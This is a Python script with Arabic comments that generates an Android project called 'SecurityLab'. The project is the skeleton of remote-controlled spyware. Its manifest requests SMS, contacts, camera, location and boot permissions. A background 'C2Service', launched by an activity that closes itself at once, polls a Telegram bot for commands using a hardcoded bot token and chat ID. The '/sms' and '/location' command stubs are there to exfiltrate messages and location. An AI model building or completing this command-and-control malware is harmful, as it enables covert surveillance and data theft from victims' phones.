import os

def create_project():
    # تعريف المجلدات الأساسية
    dirs = [
        "app/src/main/java/com/example/securitylab",
        ".github/workflows"
    ]
    
    for d in dirs:
        os.makedirs(d, exist_ok=True)
        print(f"[+] تم إنشاء المجلد: {d}")

    # 1. إنشاء ملف الصلاحيات AndroidManifest.xml
    manifest_content = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.securitylab">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="SecurityLab"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".C2Service"
            android:enabled="true"
            android:exported="false" />

    </application>
</manifest>'''
    
    with open("app/src/main/AndroidManifest.xml", "w", encoding="utf-8") as f:
        f.write(manifest_content)
    print("[+] تم إنشاء ملف: AndroidManifest.xml")

    # 2. إنشاء خدمة الاتصال الخلفية C2Service.java مع التوكن ومعرف المحادثة المدمجين
    c2_service_content = '''package com.example.securitylab;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class C2Service extends Service {
    private static final String BOT_TOKEN = "8731217847:AAH1ZwNQ28L2Ze8Uzudc3Vq13L0Ii_UeDQQ";
    private static final long ALLOWED_CHAT_ID = 7399463177L;
    private boolean isRunning = true;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        pollTelegramCommands();
                        Thread.sleep(5000);
                    } catch (Exception e) {
                        Log.e("C2Service", "Error polling: " + e.getMessage());
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private void pollTelegramCommands() {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray results = jsonResponse.getJSONArray("result");
                for (int i = 0; i < results.length(); i++) {
                    JSONObject update = results.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        long chatId = message.getJSONObject("chat").getLong("id");

                        // التحقق من أن الأوامر تُنفذ فقط من خلال الشات المسموح به
                        if (chatId == ALLOWED_CHAT_ID) {
                            handleCommand(text, chatId);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("Polling", "Exception: " + e.getMessage());
        }
    }

    private void handleCommand(String command, long chatId) {
        if (command.equals("/sms")) {
            // تنفيذ قراءة رسائل SMS وإرسالها
        } else if (command.equals("/location")) {
            // استخراج الموقع الجغرافي وإرساله
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }
}'''

    with open("app/src/main/java/com/example/securitylab/C2Service.java", "w", encoding="utf-8") as f:
        f.write(c2_service_content)
    print("[+] تم إنشاء ملف: C2Service.java مع دمج التوكن ومعرف الشات بنجاح")

    # 3. إنشاء ملف الواجهة الرئيسية MainActivity.java
    main_activity_content = '''package com.example.securitylab;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent serviceIntent = new Intent(this, C2Service.class);
        startService(serviceIntent);
        finish();
    }
}'''

    with open("app/src/main/java/com/example/securitylab/MainActivity.java", "w", encoding="utf-8") as f:
        f.write(main_activity_content)
    print("[+] تم إنشاء ملف: MainActivity.java")

    # 4. إنشاء ملف البناء السحابي GitHub Actions
    workflow_content = '''name: Build Android APK

on:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Set up JDK 17
      uses: actions/setup-java@v3
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Build with Gradle
      run: |
        chmod +x gradlew || echo "No gradlew yet"
'''

    with open(".github/workflows/build.yml", "w", encoding="utf-8") as f:
        f.write(workflow_content)
    print("[+] تم إنشاء ملف البناء: build.yml")

if __name__ == "__main__":
    create_project()
    print("\nتم الانتهاء من إنشاء جميع ملفات المشروع بالبيانات المخصصة بنجاح!")

